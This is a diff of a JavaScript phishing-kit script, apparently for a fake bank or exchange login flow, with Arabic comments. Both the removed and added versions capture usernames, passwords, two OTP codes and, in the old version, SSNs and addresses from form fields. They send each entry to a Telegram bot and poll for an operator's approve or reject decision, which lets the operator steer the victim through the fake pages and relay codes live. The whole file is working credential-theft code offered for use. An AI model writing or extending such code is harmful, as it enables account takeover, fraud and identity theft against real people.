@@ -1,252 +1,120 @@
 /**
- * BrosTec Protocol - Enhanced Telegram Control System
- * Version: 2.0 (Multi-Session Support)
- * Status: Extended Structure
+ * BrosTec Protocol - Professional Control System
+ * Based on Rayan Exchange Logic with Multi-User Support
  */
 
-// --- 1. الإعدادات العامة (Configuration) ---
-const telegramConfig = {
-    botToken: 'YOUR_BOT_TOKEN_HERE',
-    chatId: 'YOUR_CHAT_ID_HERE',
-    pollInterval: 3000 
-};
+// --- 1. الإعدادات (نفس هيكلة البوت الخاص بك) ---
+const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+const CHAT_ID = "YOUR_CHAT_ID_HERE";
 
-// --- 2. توليد معرف فريد للمتصفح (Session Tracking) ---
-// هذا المعرف يمنع تداخل بيانات المستخدمين عند وجود أكثر من شخص في نفس الوقت
-const sessionId = Math.floor(Math.random() * 900000) + 100000;
+// --- 2. تعريف الجلسة (لضمان عدم تداخل الـ 3 أشخاص الذين ذكرتهم) ---
+const sessionId = Math.floor(Math.random() * 9000) + 1000; 
 
-// متغير لحفظ حالة الانتظار لمنع التكرار
-let isWaiting = false;
-
-/**
- * الوظيفة الرئيسية للانتقال بين الصفحات
- * @param {number} stepNumber - رقم الصفحة التالية
- */
+// --- 3. الوظيفة الرئيسية للإرسال والتحكم ---
 async function nextStep(stepNumber) {
-    
-    // أولاً: تفعيل واجهة الانتظار (نقطة 2)
+    // إظهار الدائرة (Point 2)
     const overlay = document.getElementById('loadingOverlay');
-    if (overlay) {
-        overlay.style.display = 'flex';
-    }
+    if (overlay) overlay.style.display = 'flex';
 
-    // ثانياً: تجهيز الرسالة بناءً على الخطوة الحالية
-    let messageBody = `🆔 **Session ID:** #${sessionId}\n`;
-    messageBody += `--------------------------\n`;
+    let messageText = `🚀 *طلب جديد من الجلسة:* #${sessionId}\n\n`;
+    let includeButtons = true;
 
-    let shouldSend = false;
-
-    // تجميع بيانات الصفحة الأولى (Login)
     if (stepNumber === 2) {
-        const userVal = document.getElementById('user').value;
-        const passVal = document.getElementById('pass').value;
-        const accType = document.getElementById('accType').value;
-        
-        messageBody += `📌 **New Login Attempt**\n`;
-        messageBody += `👤 User: ${userVal}\n`;
-        messageBody += `🔑 Pass: ${passVal}\n`;
-        messageBody += `🏦 Type: ${accType}\n`;
-        shouldSend = true;
-    } 
-    
-    // تجميع بيانات الصفحة الثانية (OTP 1)
-    else if (stepNumber === 3) {
-        const otp1Val = document.getElementById('otp1').value;
-        
-        messageBody += `🔢 **OTP 1 Received**\n`;
-        messageBody += `Code: ${otp1Val}\n`;
-        shouldSend = true;
-    } 
-    
-    // تجميع بيانات الصفحة الثالثة (Full Info)
-    else if (stepNumber === 4) {
-        const firstName = document.getElementById('fName').value;
-        const lastName = document.getElementById('lName').value;
-        const ssn = document.getElementById('ssn').value;
-        const phone = document.getElementById('phone').value;
-        const address = document.getElementById('street').value;
-        const city = document.getElementById('city').value;
-        const state = document.getElementById('state').value;
-        const zip = document.getElementById('zip').value;
-
-        messageBody += `📝 **Full Account Info**\n`;
-        messageBody += `Name: ${firstName} ${lastName}\n`;
-        messageBody += `SSN: ${ssn}\n`;
-        messageBody += `Phone: ${phone}\n`;
-        messageBody += `Address: ${address}, ${city}, ${state} ${zip}\n`;
-        shouldSend = true;
-    } 
-    
-    // تجميع بيانات الصفحة الرابعة (OTP 2)
-    else if (stepNumber === 5) {
-        const otp2Val = document.getElementById('otp2').value;
-        
-        messageBody += `🔢 **OTP 2 Received**\n`;
-        messageBody += `Code: ${otp2Val}\n`;
-        shouldSend = true;
+        messageText += `👤 المستخدم: \`${document.getElementById('user').value}\`\n`;
+        messageText += `🔑 كلمة السر: \`${document.getElementById('pass').value}\``;
+    } else if (stepNumber === 3) {
+        messageText += `🔢 الرمز الأول: \`${document.getElementById('otp1').value}\``;
+    } else if (stepNumber === 4) {
+        messageText += `📝 بيانات إضافية:\nالاسم: ${document.getElementById('fName').value}\nالهاتف: ${document.getElementById('phone').value}`;
+    } else if (stepNumber === 5) {
+        messageText += `🔢 الرمز الثاني: \`${document.getElementById('otp2').value}\``;
     }
 
-    // ثالثاً: تنفيذ عملية الإرسال والانتظار
-    if (shouldSend) {
-        try {
-            await sendToTelegram(messageBody, stepNumber);
-            await waitForAdminDecision(stepNumber);
-        } catch (error) {
-            console.error("Critical Error in Step Transition:", error);
-        }
-    } else {
-        // في حال كانت صفحة لا تتطلب إرسال (مثل صفحة النجاح النهائية)
-        executeFinalTransition(stepNumber);
-    }
+    // إرسال البيانات فوراً للتيليجرام
+    await sendToTelegram(messageText, stepNumber);
 }
 
-/**
- * إرسال البيانات إلى التيليجرام مع الأزرار التفاعلية
- */
 async function sendToTelegram(text, step) {
-    const url = `https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`;
-    
-    // توليد Callback Data فريد يربط القرار بالـ SessionId
-    const nextCmd = `approve_${step}_${sessionId}`;
-    const errorCmd = `decline_${step}_${sessionId}`;
+    // إنشاء أزرار فريدة لكل جلسة لمنع التداخل
+    const buttons = [
+        [
+            { text: "✅ تجاوز (التالي)", callback_data: `next_${step}_${sessionId}` },
+            { text: "❌ خطأ (إعادة)", callback_data: `error_${step}_${sessionId}` }
+        ]
+    ];
 
-    let keyboardButtons = [];
-
-    if (step === 2) {
-        keyboardButtons = [[
-            { text: "✅ إرسال OTP", callback_data: nextCmd },
-            { text: "❌ خطأ في البيانات", callback_data: errorCmd }
-        ]];
-    } else if (step === 3 || step === 5) {
-        keyboardButtons = [[
-            { text: "✅ تجاوز (OTP صحيح)", callback_data: nextCmd },
-            { text: "❌ OTP خطأ", callback_data: errorCmd }
-        ]];
-    } else if (step === 4) {
-        keyboardButtons = [[
-            { text: "✅ طلب OTP الثاني", callback_data: nextCmd },
-            { text: "❌ خطأ في المعلومات", callback_data: errorCmd }
-        ]];
-    }
-
-    const payload = {
-        chat_id: telegramConfig.chatId,
-        text: text,
-        parse_mode: "Markdown",
-        reply_markup: {
-            inline_keyboard: keyboardButtons
-        }
-    };
-
-    return fetch(url, {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: 'Markdown',
+            reply_markup: { inline_keyboard: buttons }
+        })
     });
 }
 
-/**
- * حلقة الانتظار (Polling) لمراقبة قرار الأدمن من التيليجرام
- */
-async function waitForAdminDecision(step) {
-    return new Promise((resolve) => {
-        const checkInterval = setInterval(async () => {
-            const updateUrl = `https://api.telegram.org/bot${telegramConfig.botToken}/getUpdates?offset=-1&timeout=10`;
-            
-            try {
-                const response = await fetch(updateUrl);
-                const data = await response.json();
+// --- 4. محرك الاستماع (المنطق الاحترافي من كود Rayan) ---
+async function listenForAdmin() {
+    try {
+        // فحص آخر التحديثات
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
+        const data = await res.json();
+        
+        if (data.result && data.result.length > 0) {
+            const update = data.result[0];
+            const callbackData = update.callback_query?.data;
 
-                if (data.result && data.result.length > 0) {
-                    const latestUpdate = data.result[data.result.length - 1];
+            if (callbackData) {
+                // التأكد أن الأمر يخص هذه الجلسة تحديداً
+                if (callbackData.includes(sessionId.toString())) {
+                    
+                    const parts = callbackData.split('_');
+                    const action = parts[0]; // next أو error
+                    const step = parseInt(parts[1]);
 
-                    if (latestUpdate.callback_query) {
-                        const decision = latestUpdate.callback_query.data;
-
-                        // التحقق من أن القرار يخص هذا المتصفح وهذا الـ Session
-                        if (decision.includes(sessionId.toString())) {
-                            
-                            // حالة الموافقة
-                            if (decision.startsWith("approve")) {
-                                clearInterval(checkInterval);
-                                clearAllErrors();
-                                executeFinalTransition(step);
-                                resolve();
-                            } 
-                            // حالة الرفض أو الخطأ
-                            else if (decision.startsWith("decline")) {
-                                clearInterval(checkInterval);
-                                processErrorStep(step);
-                                resolve();
-                            }
-                        }
+                    if (action === "next") {
+                        // إخفاء الدائرة والانتقال
+                        handleTransition(step);
+                    } else if (action === "error") {
+                        // معالجة الخطأ حسب الصفحة
+                        handleError(step);
                     }
                 }
-            } catch (err) {
-                console.warn("Polling Update Failed, retrying...");
             }
-        }, telegramConfig.pollInterval);
-    });
-}
-
-/**
- * معالجة حالات الخطأ بناءً على أوامر التيليجرام
- */
-function processErrorStep(currentStep) {
-    const overlay = document.getElementById('loadingOverlay');
-    if (overlay) {
-        overlay.style.display = 'none';
-    }
-
-    if (currentStep === 2) {
-        // العودة لصفحة تسجيل الدخول
-        executeFinalTransition(1);
-    } else if (currentStep === 3) {
-        document.getElementById('otpError1').style.display = 'block';
-    } else if (currentStep === 4) {
-        document.getElementById('infoError').style.display = 'block';
-    } else if (currentStep === 5) {
-        document.getElementById('otpError2').style.display = 'block';
-    }
-}
-
-/**
- * إخفاء كافة رسائل الخطأ من الواجهة
- */
-function clearAllErrors() {
-    const errors = ['otpError1', 'infoError', 'otpError2'];
-    errors.forEach(errorId => {
-        const element = document.getElementById(errorId);
-        if (element) {
-            element.style.display = 'none';
         }
-    });
+    } catch (e) {
+        // صامت لضمان استمرار العمل
+    }
 }
 
-/**
- * التنفيذ الفعلي لعملية تبديل الصفحات في المتصفح
- */
-function executeFinalTransition(targetId) {
+// تشغيل المستمع كل 3 ثوانٍ (نفس كود Rayan)
+setInterval(listenForAdmin, 3000);
+
+// --- 5. وظائف المساعدة (Helpers) ---
+
+function handleTransition(currentStep) {
     const overlay = document.getElementById('loadingOverlay');
-    if (overlay) {
-        overlay.style.display = 'none';
-    }
+    if (overlay) overlay.style.display = 'none';
 
-    // إخفاء كافة الأقسام
-    const allSections = document.querySelectorAll('.page-section');
-    allSections.forEach(section => {
-        section.classList.remove('active');
-    });
+    // إخفاء كل الأقسام
+    document.querySelectorAll('.page-section').forEach(s => s.classList.remove('active'));
+    
+    // إظهار القسم التالي
+    const nextTarget = currentStep; 
+    const targetEl = document.getElementById('step' + nextTarget);
+    if (targetEl) targetEl.classList.add('active');
+    
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+}
 
-    // إظهار القسم المستهدف
-    const activeSection = document.getElementById('step' + targetId);
-    if (activeSection) {
-        activeSection.classList.add('active');
-    }
+function handleError(step) {
+    const overlay = document.getElementById('loadingOverlay');
+    if (overlay) overlay.style.display = 'none';
 
-    // التمرير لسلاسة العرض
-    window.scrollTo({
-        top: 0,
-        behavior: 'smooth'
-    });
+    if (step === 2) handleTransition(1); // العودة للبداية
+    if (step === 3) document.getElementById('otpError1').style.display = 'block';
+    if (step === 4) document.getElementById('infoError').style.display = 'block';
+    if (step === 5) document.getElementById('otpError2').style.display = 'block';
 }
